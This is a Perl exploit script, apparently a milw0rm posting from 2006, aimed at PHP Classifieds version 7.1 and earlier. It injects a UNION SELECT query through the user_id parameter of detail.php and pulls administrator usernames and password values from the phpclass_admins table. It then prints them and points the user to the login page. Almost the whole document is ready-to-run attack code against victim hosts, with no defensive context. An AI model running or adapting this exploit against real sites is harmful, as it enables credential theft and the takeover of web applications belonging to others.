<html><head><title>PHP Classifieds <= 7.1 (detail.php) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#[Script Name: Php Classifieds &lt;= 7.1 (detail.php) Remote SQL Injection Exploit
#[Coded by   : ajann
#[Author     : ajann
#[Contact    : :(
use IO::Socket;
if(@ARGV &lt; 3){
print &quot;
[========================================================================
[//  Php Classifieds &lt;= 7.1 (detail.php) Remote SQL Injection Exploit
[//           Usage: class.pl [target] [path] [userid]
[//                   Example: class.pl victim.com / 1
[//                   Example: class.pl victim.com /path/ 1
[//                           Vuln&amp;Exp : ajann
[========================================================================
&quot;;
exit();
}
#Local variables
$classifiedsserver = $ARGV[0];
$classifiedsserver =~ s/(http:\/\/)//eg;
$classifiedshost = &quot;http://&quot;.$classifiedsserver;
$classifiedsport = &quot;80&quot;;
$classifiedsdir = $ARGV[1];
$classifiedsfile = &quot;detail.php?id=1009&amp;contact=1&amp;user_id=&quot;;
$classifiedsend = &quot;member_login.php&quot;;
$classifiedstarget = &quot;1%20union%20select%20concat(adm_name,char(32),adm_pass)%20from%20phpclass_admins%20where%20adm_id%20like%20&quot;.$ARGV[2];
$classifiedstarget = $classifiedshost.$classifiedsdir.$classifiedsfile.$classifiedstarget;
#Writing data to socket
print &quot;+**********************************************************************+\n&quot;;
print &quot;+ Trying to connect: $classifiedsserver\n&quot;;
$classifieds = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$classifiedsserver&quot;, PeerPort =&gt; &quot;$classifiedsport&quot;) || die &quot;\n+ Connection failed...\n&quot;;
print $classifieds &quot;GET $classifiedstarget\n&quot;;
print $classifieds &quot;Host: $classifiedsserver\n&quot;;
print $classifieds &quot;Accept: */*\n&quot;;
print $classifieds &quot;Connection: close\n\n&quot;;
print &quot;+ Connected!...\n&quot;;
#Getting
while($answer = &lt;$classifieds&gt;) {
if ($answer =~ /&lt;b&gt;(.*?)&lt;\/b&gt;/){ 
print &quot;+ Exploit succeed! Getting admin information.\n&quot;;
print &quot;+ ---------------- +\n&quot;;
print &quot;+ Username and Password: $1\n&quot;;
print &quot;+ Lets go $classifiedshost$classifiedsdir$classifiedsend and\n+ Login with this information. \n&quot;;
exit();
}

if ($answer =~ /Ad removed or not yet approved/) { 
print &quot;+ Exploit Failed : ( \n&quot;;
print &quot;+**********************************************************************+\n&quot;;
exit(); 
}

if ($answer =~ /Internal Server Error/) {
print &quot;+ Exploit Failed : (  \n&quot;;
print &quot;+**********************************************************************+\n&quot;;
exit(); 
}
}
print &quot;+ Exploit failed :(\n&quot;;
print &quot;+**********************************************************************+\n&quot;;

# milw0rm.com [2006-11-05]</pre></html>